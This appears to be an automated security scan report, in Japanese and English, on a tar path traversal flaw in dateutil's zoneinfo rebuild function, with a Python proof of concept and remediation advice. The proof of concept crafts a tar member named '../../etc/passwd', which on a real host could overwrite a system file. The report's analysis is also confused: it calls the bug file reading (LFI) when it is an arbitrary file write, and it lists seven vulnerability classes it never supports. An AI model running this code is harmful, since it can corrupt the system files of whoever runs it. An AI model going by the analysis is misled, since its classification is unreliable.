# PAR Security Analysis Report

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 90**

## 脆弱性タイプ

- `LFI`
- `RCE`
- `SSRF`
- `AFO`
- `SQLI`
- `XSS`
- `IDOR`

## PAR Policy Analysis

## 詳細解析

The function `rebuild` uses `TarFile.extract(name, tmpdir)` on user-supplied entries in `zonegroups` without validating or sanitizing the member names. An attacker can supply path traversal sequences (e.g., “../../etc/passwd”) in the `zonegroups` list to cause extraction of arbitrary files from the host filesystem into the temporary directory. This is a classic LFI via tar path traversal vulnerability.

## PoC（概念実証コード）

```text
# PoC: extract /etc/passwd
from dateutil.zoneinfo.rebuild import rebuild
# craft a minimal tar with a malicious member name
import tarfile, io
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode='w') as tf:
    info = tarfile.TarInfo(name='../../etc/passwd')
    data = b'dummy'
    info.size = len(data)
    tf.addfile(info, io.BytesIO(data))
buf.seek(0)
# write malicious tar to disk
with open('malicious.tar', 'wb') as f:
    f.write(buf.read())
# call rebuild with path traversal entry
datetag = None
rebuild('malicious.tar', zonegroups=['../../etc/passwd'], metadata={})
```

## 修復ガイダンス

### dateutil.zoneinfo.rebuild

- **Required**: Validate and sanitize tar member names before extraction
- **Guidance**: Use a safe extraction routine that rejects paths containing '..' or absolute paths, e.g. check each member.name for '..' or leading '/' and normalize paths before extract.
- **Priority**: high

## 解析ノート

1. Identify TarFile.extract usage on user input zonegroups
2. Recognize lack of path sanitization allows '../' traversal
3. Confirm LFI via hostile tar member names
4. Prepare PoC showing extraction of /etc/passwd
5. Suggest safe extraction validation

